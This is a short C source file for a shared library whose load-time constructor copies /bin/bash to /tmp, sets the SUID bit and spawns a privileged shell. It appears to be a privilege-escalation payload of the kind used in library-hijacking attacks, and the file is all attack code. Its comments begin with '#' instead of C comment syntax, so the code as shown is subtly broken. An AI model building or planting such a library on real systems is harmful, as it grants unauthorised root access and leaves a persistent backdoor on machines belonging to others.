#include <stdio.h>
#include <stdlib.h>

# GCC attribute which will be run when a shared library is loaded.
static void inject() __attribute__((constructor));

void inject() {
  # copies over /bin/bash and adds SUID bit to get root shell
  system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
